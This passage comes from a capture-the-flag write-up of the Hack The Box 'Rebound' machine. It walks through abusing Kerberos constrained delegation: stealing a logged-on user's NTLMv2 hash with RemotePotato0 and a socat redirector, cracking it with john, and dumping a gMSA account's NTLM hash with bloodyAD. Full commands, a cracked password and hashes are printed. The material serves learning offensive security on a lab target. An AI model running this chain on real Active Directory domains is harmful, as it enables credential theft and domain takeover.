<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">Get</span><span class="o">-</span><span class="n">NetComputer</span> <span class="o">*</span> <span class="o">|</span> <span class="n">select</span> <span class="n">name</span><span class="p">,</span> <span class="n">msds</span><span class="o">-</span><span class="n">allowedtodelegateto</span><span class="p">,</span> <span class="n">useraccountcontrol</span> <span class="o">|</span> <span class="n">fl</span>         


<span class="n">name</span>                     <span class="p">:</span> <span class="n">DC01</span>
<span class="n">msds</span><span class="o">-</span><span class="n">allowedtodelegateto</span> <span class="p">:</span> 
<span class="n">useraccountcontrol</span>       <span class="p">:</span> <span class="n">SERVER_TRUST_ACCOUNT</span><span class="p">,</span> <span class="n">TRUSTED_FOR_DELEGATION</span> 

<span class="n">name</span>                     <span class="p">:</span> <span class="n">delegator</span>
<span class="n">msds</span><span class="o">-</span><span class="n">allowedtodelegateto</span> <span class="p">:</span> <span class="n">http</span><span class="o">/</span><span class="n">dc01</span><span class="o">.</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>
<span class="n">useraccountcontrol</span>       <span class="p">:</span> <span class="n">WORKSTATION_TRUST_ACCOUNT</span>



<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>Well, let's explain what this privilege entails:</p><br/>
<p><em>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</em></p><br/>
<p>I took this information from this <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation#computer-account">article</a>.</p><br/>
<p>In other words, Constrained delegation allows a service to impersonate a user and access another service on behalf of that user. It's often used for seamless authentication across multiple services. When configured, a service can request a Kerberos ticket for a user and use it to access other services on the user's behalf, within the specified constraints.</p><br/>
<p>The <code>msDS-AllowedToDelegateTo</code> specifies which services a particular service can delegate to. This attribute is set on the user or computer object that represents the service requesting delegation.</p><br/>
<p>This implies that leveraging <code>delegator$</code>, we could potentially exploit constrained delegation over the <code>http/dc01.rebound.htb</code> service, which could serve as a privilege escalation vector. However, since we lack valid credentials for <code>delegator$</code>, we need to find a method to gain access as that user.</p><br/>
<p>After searching for paths to get to the <code>delegator$</code> user, I found this:</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/insane/rebound/img/4.png"/></p><br/>
<p>This is pretty interesting. TBrady can read the GMSA Password of <code>gmsa.rebound.htb</code> (<code>delegator$</code>). This means that, as TBrady, we can obtain valid credentials for <code>delegator$</code>. However, firstly, we need to find a way to gain access or obtain valid credentials for <code>tbrady</code>.</p><br/>
<p>Bloodhound didn't report any potential vectors to achieve access as TBrady, aside from administrative privileges.</p><br/>
<p><img alt="" src="https://elswix.github.io/writeups/htb/insane/rebound/img/5.png"/></p><br/>
<p>Upon enumerating the running processes on the victim machine, something caught my attention:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">get</span><span class="o">-</span><span class="n">process</span>

<span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="n">SI</span> <span class="n">ProcessName</span>                                                  
<span class="o">-------</span>  <span class="o">------</span>    <span class="o">-----</span>      <span class="o">-----</span>     <span class="o">------</span>     <span class="o">--</span>  <span class="o">--</span> <span class="o">-----------</span>                                                  
    <span class="mi">384</span>      <span class="mi">32</span>    <span class="mi">11976</span>      <span class="mi">20796</span>              <span class="mi">2604</span>   <span class="mi">0</span> <span class="n">certsrv</span>                                                      
    <span class="mi">115</span>       <span class="mi">5</span>     <span class="mi">2352</span>       <span class="mi">4196</span>       <span class="mf">0.02</span>   <span class="mi">5852</span>   <span class="mi">0</span> <span class="n">cmd</span>                                                          
    <span class="mi">153</span>       <span class="mi">9</span>     <span class="mi">6664</span>      <span class="mi">12648</span>       <span class="mf">0.02</span>   <span class="mi">5340</span>   <span class="mi">0</span> <span class="n">conhost</span>                                                      
    <span class="mi">482</span>      <span class="mi">19</span>     <span class="mi">2360</span>       <span class="mi">5604</span>               <span class="mi">388</span>   <span class="mi">0</span> <span class="n">csrss</span>                                                        
    <span class="mi">268</span>      <span class="mi">16</span>     <span class="mi">2200</span>       <span class="mi">5260</span>               <span class="mi">508</span>   <span class="mi">1</span> <span class="n">csrss</span>                                                        
    <span class="mi">361</span>      <span class="mi">15</span>     <span class="mi">3436</span>      <span class="mi">14892</span>              <span class="mi">5520</span>   <span class="mi">1</span> <span class="n">ctfmon</span>                       
    <span class="mi">382</span>      <span class="mi">30</span>     <span class="mi">7720</span>      <span class="mi">12088</span>              <span class="mi">2744</span>   <span class="mi">0</span> <span class="n">dns</span>                                                          
    <span class="mi">581</span>      <span class="mi">24</span>    <span class="mi">24468</span>      <span class="mi">50576</span>               <span class="mi">320</span>   <span class="mi">1</span> <span class="n">dwm</span>                                                          
   <span class="mi">1405</span>      <span class="mi">55</span>    <span class="mi">21736</span>      <span class="mi">83552</span>              <span class="mi">5784</span>   <span class="mi">1</span> <span class="n">explorer</span>            <span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>                                                    
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>As you can see, there are processes with Session ID 1, which indicates that someone has an active session on the box. This is unusual on a HTB machine. However, the issue arises when inspecting the <code>active sessions</code>, as it doesn't display anything.</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">query</span> <span class="n">user</span> <span class="o">*</span>
<span class="n">query</span> <span class="n">user</span> <span class="o">*</span>
<span class="n">No</span> <span class="n">User</span> <span class="n">exists</span> <span class="k">for</span> <span class="o">*</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">qwinsta</span> <span class="o">*</span>
<span class="n">No</span> <span class="n">session</span> <span class="n">exists</span> <span class="k">for</span> <span class="o">*</span>
</pre></div>
<p>That's strange; I'm not entirely sure why it's not displaying anything. It could be because we're executing them remotely. Anyway, when I executed it with <a href="https://github.com/antonioCoco/RunasCs/releases/tag/v1.5">RunasCs</a>, it worked fine:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">runascs</span><span class="o">.</span><span class="n">exe</span> <span class="n">winrm_svc</span> <span class="s1">'Password123!'</span> <span class="s1">'cmd /c query user'</span> <span class="o">-</span><span class="n">l</span> <span class="mi">9</span>

 <span class="n">USERNAME</span>              <span class="n">SESSIONNAME</span>        <span class="n">ID</span>  <span class="n">STATE</span>   <span class="n">IDLE</span> <span class="n">TIME</span>  <span class="n">LOGON</span> <span class="n">TIME</span>
 <span class="n">tbrady</span>                <span class="n">console</span>             <span class="mi">1</span>  <span class="n">Active</span>      <span class="n">none</span>   <span class="mi">3</span><span class="o">/</span><span class="mi">30</span><span class="o">/</span><span class="mi">2024</span> <span class="mi">2</span><span class="p">:</span><span class="mi">03</span> <span class="n">PM</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>This suggests that the reason it wasn't working previously could indeed be due to executing them remotely. Since <code>RunasCs</code> creates a local process, it may have resolved the issue this time.</p><br/>
<p>This is intriguing; <strong>TBrady</strong> is currently logged on to the box.</p><br/>
<h3>Remote Potato - Concept</h3><br/>
<p>RemotePotato is a exploit that enables us to exploit active sessions on the system. As per the <a href="https://github.com/antonioCoco/RemotePotato0">official</a> repository:</p><br/>
<p><em>It abuses the DCOM activation service and trigger an NTLM authentication of any user currently logged on in the target machine. RemotePotato0 also allows to grab and steal NTLMv2 hashes of every users logged on a machine</em></p><br/>
<p>To relay an NTLM authentication for command execution, the user needs to possess administrator or local administrator privileges on the system, which <strong>TBrady</strong> lacks. However, this method still enables us to steal NTLMv2 hashes, which can subsequently be cracked to recover the user password.</p><br/>
<h3>RemotePotato - Exploitation</h3><br/>
<p>Firstly, I uploaded the <a href="https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip">compiled</a> version onto the victim machine:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">RemotePotato0</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">h</span>


        <span class="n">RemotePotato0</span>
        <span class="nd">@splinter_code</span> <span class="o">&amp;</span> <span class="nd">@decoder_it</span>



<span class="n">Mandatory</span> <span class="n">args</span><span class="p">:</span>
<span class="o">-</span><span class="n">m</span> <span class="n">module</span>
        <span class="n">Allowed</span> <span class="n">values</span><span class="p">:</span>
        <span class="mi">0</span> <span class="o">-</span> <span class="n">Rpc2Http</span> <span class="n">cross</span> <span class="n">protocol</span> <span class="n">relay</span> <span class="n">server</span> <span class="o">+</span> <span class="n">potato</span> <span class="n">trigger</span> <span class="p">(</span><span class="n">default</span><span class="p">)</span>
        <span class="mi">1</span> <span class="o">-</span> <span class="n">Rpc2Http</span> <span class="n">cross</span> <span class="n">protocol</span> <span class="n">relay</span> <span class="n">server</span>
        <span class="mi">2</span> <span class="o">-</span> <span class="n">Rpc</span> <span class="n">capture</span> <span class="p">(</span><span class="nb">hash</span><span class="p">)</span> <span class="n">server</span> <span class="o">+</span> <span class="n">potato</span> <span class="n">trigger</span>
        <span class="mi">3</span> <span class="o">-</span> <span class="n">Rpc</span> <span class="n">capture</span> <span class="p">(</span><span class="nb">hash</span><span class="p">)</span> <span class="n">server</span>


<span class="n">Other</span> <span class="n">args</span><span class="p">:</span> <span class="p">(</span><span class="n">someone</span> <span class="n">could</span> <span class="n">be</span> <span class="n">mandatory</span> <span class="ow">and</span><span class="o">/</span><span class="ow">or</span> <span class="n">optional</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">module</span> <span class="n">you</span> <span class="n">use</span><span class="p">)</span>
<span class="o">-</span><span class="n">r</span> <span class="n">Remote</span> <span class="n">HTTP</span> <span class="n">relay</span> <span class="n">server</span> <span class="n">ip</span>
<span class="o">-</span><span class="n">t</span> <span class="n">Remote</span> <span class="n">HTTP</span> <span class="n">relay</span> <span class="n">server</span> <span class="n">port</span> <span class="p">(</span><span class="n">Default</span> <span class="mi">80</span><span class="p">)</span>
<span class="o">-</span><span class="n">x</span> <span class="n">Rogue</span> <span class="n">Oxid</span> <span class="n">Resolver</span> <span class="n">ip</span> <span class="p">(</span><span class="n">default</span> <span class="mf">127.0.0.1</span><span class="p">)</span>
<span class="o">-</span><span class="n">p</span> <span class="n">Rogue</span> <span class="n">Oxid</span> <span class="n">Resolver</span> <span class="n">port</span> <span class="p">(</span><span class="n">default</span> <span class="mi">9999</span><span class="p">)</span>
<span class="o">-</span><span class="n">l</span> <span class="n">RPC</span> <span class="n">Relay</span> <span class="n">server</span> <span class="n">listening</span> <span class="n">port</span> <span class="p">(</span><span class="n">Default</span> <span class="mi">9997</span><span class="p">)</span>
<span class="o">-</span><span class="n">s</span> <span class="n">Session</span> <span class="nb">id</span> <span class="k">for</span> <span class="n">the</span> <span class="n">Cross</span> <span class="n">Session</span> <span class="n">Activation</span> <span class="n">attack</span> <span class="p">(</span><span class="n">default</span> <span class="n">disabled</span><span class="p">)</span>
<span class="o">-</span><span class="n">c</span> <span class="n">CLSID</span> <span class="p">(</span><span class="n">Default</span> <span class="p">{</span><span class="mi">5167</span><span class="n">B42F</span><span class="o">-</span><span class="n">C111</span><span class="o">-</span><span class="mi">47</span><span class="n">A1</span><span class="o">-</span><span class="n">ACC4</span><span class="o">-</span><span class="mi">8</span><span class="n">EABE61B0B54</span><span class="p">})</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>To execute it, I'll utilize the specified parameters:</p><br/>
<p><strong>-m 2</strong>: indicating method 2, which involves "Rpc capture (hash) server + potato trigger" 
<strong>-x 10.10.16.5</strong>: setting the rogue Oxid resolver IP to my own</p><br/>
<p>In order to perform OXID resolution, we need to redirect traffic back to RemotePotato for the RPC calls:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">socat</span> <span class="o">-</span><span class="n">v</span> <span class="n">TCP</span><span class="o">-</span><span class="n">LISTEN</span><span class="p">:</span><span class="mi">135</span><span class="p">,</span><span class="n">fork</span><span class="p">,</span><span class="n">reuseaddr</span> <span class="n">TCP</span><span class="p">:</span><span class="mf">10.10.11.231</span><span class="p">:</span><span class="mi">9999</span>
</pre></div>
<p>Finally, let's execute <code>RemotePotato</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">RemotePotato0</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">m</span> <span class="mi">2</span> <span class="o">-</span><span class="n">x</span> <span class="mf">10.10.16.5</span>        
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Detected</span> <span class="n">a</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="n">version</span> <span class="ow">not</span> <span class="n">compatible</span> <span class="k">with</span> <span class="n">JuicyPotato</span><span class="o">.</span> <span class="n">RogueOxidResolver</span> <span class="n">must</span> <span class="n">be</span> <span class="n">run</span> <span class="n">remotely</span><span class="o">.</span> <span class="n">Remember</span> <span class="n">to</span> <span class="n">forward</span>
 <span class="n">tcp</span> <span class="n">port</span> <span class="mi">135</span> <span class="n">on</span> <span class="mf">10.10.16.5</span> <span class="n">to</span> <span class="n">your</span> <span class="n">victim</span> <span class="n">machine</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9999</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Example</span> <span class="n">Network</span> <span class="n">redirector</span><span class="p">:</span> 
        <span class="n">sudo</span> <span class="n">socat</span> <span class="o">-</span><span class="n">v</span> <span class="n">TCP</span><span class="o">-</span><span class="n">LISTEN</span><span class="p">:</span><span class="mi">135</span><span class="p">,</span><span class="n">fork</span><span class="p">,</span><span class="n">reuseaddr</span> <span class="n">TCP</span><span class="p">:{{</span><span class="n">ThisMachineIp</span><span class="p">}}:</span><span class="mi">9999</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">the</span> <span class="n">RPC</span> <span class="n">server</span> <span class="n">to</span> <span class="n">capture</span> <span class="n">the</span> <span class="n">credentials</span> <span class="nb">hash</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">user</span> <span class="n">authentication</span><span class="err">!!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Calling</span> <span class="n">CoGetInstanceFromIStorage</span> <span class="k">with</span> <span class="n">CLSID</span><span class="p">:{</span><span class="mi">5167</span><span class="n">B42F</span><span class="o">-</span><span class="n">C111</span><span class="o">-</span><span class="mi">47</span><span class="n">A1</span><span class="o">-</span><span class="n">ACC4</span><span class="o">-</span><span class="mi">8</span><span class="n">EABE61B0B54</span><span class="p">}</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">RPC</span> <span class="n">relay</span> <span class="n">server</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9997</span> <span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">RogueOxidResolver</span> <span class="n">RPC</span> <span class="n">Server</span> <span class="n">listening</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9999</span> <span class="o">...</span> 
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">IStoragetrigger</span> <span class="n">written</span><span class="p">:</span> <span class="mi">102</span> <span class="nb">bytes</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ServerAlive2</span> <span class="n">RPC</span> <span class="n">Call</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ResolveOxid2</span> <span class="n">RPC</span> <span class="n">call</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Received</span> <span class="n">the</span> <span class="n">relayed</span> <span class="n">authentication</span> <span class="n">on</span> <span class="n">the</span> <span class="n">RPC</span> <span class="n">relay</span> <span class="n">server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9997</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Connected</span> <span class="n">to</span> <span class="n">RPC</span> <span class="n">Server</span> <span class="mf">127.0.0.1</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9999</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="nb">hash</span> <span class="n">stolen</span><span class="err">!</span>

<span class="n">NTLMv2</span> <span class="n">Client</span>   <span class="p">:</span> <span class="n">DC01</span>
<span class="n">NTLMv2</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">rebound</span>\<span class="n">tbrady</span>
<span class="n">NTLMv2</span> <span class="n">Hash</span>     <span class="p">:</span> <span class="n">tbrady</span><span class="p">::</span><span class="n">rebound</span><span class="p">:</span><span class="mi">4</span><span class="n">a10cad65178c009</span><span class="p">:</span><span class="n">a45c29b4dd1b9a748c7f0d847bb892a1</span><span class="p">:</span><span class="mi">0101000000000000</span><span class="n">bf1b40ecd682da016a727184289d97</span>
<span class="n">ba0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e0068007400620003002000</span>
<span class="mf">64006300300031002e007200650062006</span><span class="n">f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800bf1b40</span>
<span class="n">ecd682da01060004000600000008003000300000000000000001000000002000007d3e4973ba9fec2f29ba64a9e0aacdb12dc773ec0849f29b8386770e75f90f50</span>
<span class="mi">0</span><span class="n">a00100000000000000000000000000000000000090000000000000000000000</span>

<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">temp</span><span class="o">&gt;</span>
</pre></div>
<p>Great! As you can see, we've successfully stolen the NTLMv2 hash of <code>tbrady</code>.</p><br/>
<p>Now, let's attempt to crack it and retrieve the user password in plain text.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="nb">hash</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">netntlmv2</span><span class="p">,</span> <span class="n">NTLMv2</span> <span class="n">C</span><span class="o">/</span><span class="n">R</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="mi">32</span><span class="o">/</span><span class="mi">64</span><span class="p">])</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="k">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>

<span class="mi">543</span><span class="n">BOMBOMBUNmanda</span> <span class="p">(</span><span class="n">tbrady</span><span class="p">)</span>     

<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">07</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">30</span> <span class="mi">09</span><span class="p">:</span><span class="mi">33</span><span class="p">)</span> <span class="mf">0.1295</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">1578</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">1578</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">1578</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="mf">5449944..543584</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show --format=netntlmv2"</span> <span class="n">options</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>It has been successfully cracked, and we obtained the user password in plain text. Let's verify that it works using <code>crackmapexec</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'tbrady'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'543BOMBOMBUNmanda'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">tbrady</span><span class="p">:</span><span class="mi">543</span><span class="n">BOMBOMBUNmanda</span>
</pre></div>
<p>Recalling what we've seen on the BloodHound report, as <code>tbrady</code>, we can read the GMSA password of <code>delegator$</code>. To achieve this, we can use <a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper</a>. Additionally, BloodyAD can also retrieve the GMSA password.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">bloodyAD</span> <span class="o">-</span><span class="n">d</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'tbrady'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'543BOMBOMBUNmanda'</span> <span class="o">--</span><span class="n">host</span> <span class="mf">10.10.11.231</span> <span class="n">get</span> <span class="nb">object</span> <span class="s1">'delegator$'</span> <span class="o">--</span><span class="n">attr</span> <span class="s1">'msDS-ManagedPassword'</span>

<span class="n">distinguishedName</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">delegator</span><span class="p">,</span><span class="n">CN</span><span class="o">=</span><span class="n">Managed</span> <span class="n">Service</span> <span class="n">Accounts</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">rebound</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">htb</span>
<span class="n">msDS</span><span class="o">-</span><span class="n">ManagedPassword</span><span class="o">.</span><span class="n">NTLM</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e1630b0e18242439a50e9d8b5f5b7524</span>
<span class="n">msDS</span><span class="o">-</span><span class="n">ManagedPassword</span><span class="o">.</span><span class="n">B64ENCODED</span><span class="p">:</span> <span class="mi">5</span><span class="n">bJ7n8t25Xmw187W3VrZocgFCr8VnedxIVdiml6khM2WAeex8N5QleqK4</span><span class="o">/</span><span class="n">TcRNUDQ8flaPX1lbwNF</span><span class="o">+</span><span class="n">GRtnHQMEM9WLY22DgoU</span><span class="o">/</span><span class="n">ZDOfYlHp</span><span class="o">/</span><span class="n">iSFjCEtRtRobUf</span><span class="o">+</span><span class="n">Mr1bbAiAY9</span><span class="o">+</span><span class="mi">5</span><span class="n">Xb6nco</span><span class="o">/</span><span class="n">v8kWT4LE9hDH3bkfSe4TOJEVpHURKg5vJqEfL8hTviel0YNdJBF0VsMWJ1pWtSjwuW2bvncgqaMhol6i9Qpn0ADf7srMqMR5XXdVHxCcAyr08Q89fhlyTKOb4YfhnQvHGROtsUp0ySKNHLTv4bYDy6u2J</span><span class="o">/</span><span class="n">YBefaK6LraH</span><span class="o">+</span><span class="n">RwP</span><span class="o">/</span><span class="n">yRodXQTvD3wzDAmjx</span><span class="o">/</span><span class="n">QqRfEy7j1hL9A</span><span class="o">==</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>I'll retain the NTLM hash and verify its validity using <code>crackmapexec</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'delegator$'</span> <span class="o">-</span><span class="n">H</span> <span class="s1">'e1630b0e18242439a50e9d8b5f5b7524'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">delegator</span><span class="err">$</span><span class="p">:</span><span class="n">e1630b0e18242439a50e9d8b5f5b7524</span>
</pre></div>
<p>It works, and now we have access as <code>delegator$</code>.</p><br/>
<h3>Constrained Delegation (CD)</h3><br/>
<p>As explained above, constrained delegation allows a service to impersonate a user to access another service on behalf of that user. Unlike unconstrained delegation, where a service can impersonate any user to access any service, constrained delegation restricts the services that can be accessed and limits the delegation to specific services.</p><br/>
<p>As <code>delegator$</code>, we possess constrained delegation privileges over <code>http/dc01.rebound.htb</code>. Since we lack direct access to <code>delegator$</code>, exploiting this becomes more challenging. However, we can achieve this remotely.</p><br/>
<h3>Resource Based Constrained Delegation</h3><br/>
<p>To exploit this, I'll execute <a href="https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd">Resource-Based Constrained Delegation (RBCD)</a> to delegate <code>delegator$</code> from a domain user like <code>ldap_monitor</code>. Essentially, we'll configure RBCD to subsequently exploit CD.</p><br/>
<p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">Resource-Based Constrained Delegation (RBCD)</a> enables services to impersonate users and access other services on behalf of those users. Unlike traditional Constrained Delegation (CD), which relies on delegating based on the client service (initiator), RBCD delegates permissions based on the target service (resource). This allows for more precise control over delegation, as administrators can specify exactly which services a service account is allowed to impersonate.</p><br/>
<p>The <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute is used to define which accounts are allowed to act on behalf of other identities for the purpose of Kerberos constrained delegation. When an account has this attribute set, it can be used to obtain service tickets (ST) on behalf of other accounts, effectively allowing it to impersonate those accounts for specific services.</p><br/>
<p>To implement Resource-Based Constrained Delegation (RBCD), we can utilize the <code>rbcd.py</code> script from the <strong>impacket</strong> suite. This script primarily sets the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on the target specified in the <code>-delegate-to</code> parameter.</p><br/>
<hr/>
<h3>Note</h3><br/>
<p>This works because Computer Accounts (in our case <code>delegator$</code>) can write their own <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. Otherwise, it wouldn't work.</p><br/>
<hr/>
